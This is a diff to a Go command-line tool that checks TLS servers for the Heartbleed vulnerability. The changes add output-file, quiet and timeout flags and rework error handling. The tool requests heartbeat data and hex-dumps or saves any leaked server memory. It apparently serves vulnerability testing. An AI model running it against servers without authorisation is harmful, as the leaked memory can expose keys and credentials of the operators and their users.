@@ -6,6 +6,7 @@ import (
 	"flag"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"net"
 	"os"
 	"time"
@@ -19,8 +20,10 @@ misuse of this tool for malicious purposes.
 `
 
 var (
-	n   = flag.Int("n", 16, "number of bytes to request")
-	bin = flag.Bool("bin", false, "output binary data instead of a hex dump")
+	nbytes  = flag.Int("n", 16, "number of bytes to request")
+	output  = flag.String("o", "", "write binary data to the specified file")
+	quiet   = flag.Bool("q", false, "quiet, use exit code to report server status (0=safe)")
+	timeout = flag.Duration("t", 5*time.Second, "i/o timeout")
 )
 
 func init() {
@@ -42,45 +45,56 @@ func main() {
 	}
 	defer c.Close()
 
-	info("Connected to %s\n", flag.Arg(0))
-	c.SetReadDeadline(time.Now().Add(5 * time.Second))
+	info("Connected to %s", flag.Arg(0))
+	c.SetDeadline(time.Now().Add(*timeout))
 
 	if _, err := c.Heartbeat(nil); err != nil {
-		info("Server does not support TLS heartbeats :)\n")
-		if !isTimeout(err) {
-			panic(err)
+		info("Server does not support TLS heartbeats :)")
+		if isTimeout(err) || isUnexpected(err) {
+			return
 		}
-		return
-	}
-	info("Server supports TLS heartbeats, requesting %d bytes...\n", *n)
-
-	b, err := c.Heartbleed(*n)
-	if len(b) > 0 {
-		if *bin {
-			os.Stdout.Write(b)
-		} else {
-			w := hex.Dumper(os.Stdout)
-			w.Write(b)
-			w.Close()
-		}
-		info("Server is vulnerable :(\n")
-	} else {
-		info("Server is not vulnerable :)\n")
-	}
-	if err != nil && !isTimeout(err) {
 		panic(err)
 	}
+
+	info("Server supports TLS heartbeats, requesting %d bytes...", *nbytes)
+	b, err := c.Heartbleed(*nbytes)
+	if len(b) == 0 && err != nil {
+		info("Server is not vulnerable :)")
+		if err == io.EOF || isTimeout(err) {
+			return
+		}
+		panic(err)
+	}
+
+	if *output != "" {
+		ioutil.WriteFile(*output, b, 0666)
+	}
+	if !*quiet {
+		w := hex.Dumper(os.Stdout)
+		w.Write(b)
+		w.Close()
+	}
+	info("Server is vulnerable :(")
+	if err != nil {
+		panic(err)
+	}
+	os.Exit(1)
 }
 
 func info(format string, a ...interface{}) {
-	fmt.Fprintf(os.Stderr, format, a...)
+	if !*quiet {
+		fmt.Fprintf(os.Stderr, format+"\n", a...)
+	}
 }
 
 func isTimeout(err error) bool {
-	if err, ok := err.(net.Error); ok && err.Timeout() {
-		return true
-	}
-	return false
+	e, ok := err.(net.Error)
+	return ok && e.Timeout()
+}
+
+func isUnexpected(err error) bool {
+	e, ok := err.(*net.OpError)
+	return ok && e.Err == alertUnexpectedMessage
 }
 
 func (c *Conn) Heartbeat(b []byte) ([]byte, error) {
